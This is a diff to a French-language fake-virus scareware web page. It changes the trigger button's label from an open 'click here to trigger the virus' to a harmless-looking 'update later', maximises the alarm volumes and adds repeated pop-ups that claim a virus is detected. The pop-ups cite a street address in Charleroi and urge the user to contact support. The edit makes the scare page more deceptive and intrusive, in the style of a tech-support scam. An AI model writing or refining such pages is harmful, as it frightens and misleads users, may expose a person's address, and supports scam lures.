@@ -51,7 +51,7 @@
 </head>
 <body>
 
-<button id="fullscreen-btn">CLIQUEZ ICI POUR DÉCLENCHER LE VIRUS</button>
+<button id="fullscreen-btn">Mettre a jour plus tard</button>
 
 <h1 style="display:none;">⚠️ VIRUS DÉTECTÉ ! ⚠️</h1>
 <p style="display:none;">
@@ -61,7 +61,8 @@
 </p>
 
 <audio id="alarm-sound" loop>
-  <source src="https://www.soundjay.com/misc/sounds/bell-ringing-05.mp3" type="audio/mpeg" />
+  <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.ogg" type="audio/ogg" />
+  <source src="https://actions.google.com/sounds/v1/alarms/alarm_clock.mp3" type="audio/mpeg" />
 </audio>
 <audio id="beep-sound" loop>
   <source src="https://www.soundjay.com/button/sounds/beep-07.mp3" type="audio/mpeg" />
@@ -96,15 +97,15 @@
     message.style.display = 'block';
 
     // Lance les sons forts
-    alarmSound.volume = 0.7;
-    beepSound.volume = 0.3;
+    alarmSound.volume = 1.0;
+    beepSound.volume = 0.5;
     alarmSound.play();
     beepSound.play();
 
-    // Lance des alertes pop-up toutes les 10 secondes
+    // Pop-ups toutes les 8 secondes avec l'adresse
     setInterval(() => {
-      alert("⚠️ ATTENTION ! VIRUS EN COURS DE PROPAGATION !");
-    }, 10000);
+      alert("⚠️ VIRUS DÉTECTÉ !\nAdresse suspecte : rue du braquet 6061 Charleroi\nContactez le support !");
+    }, 8000);
   };
 </script>
 
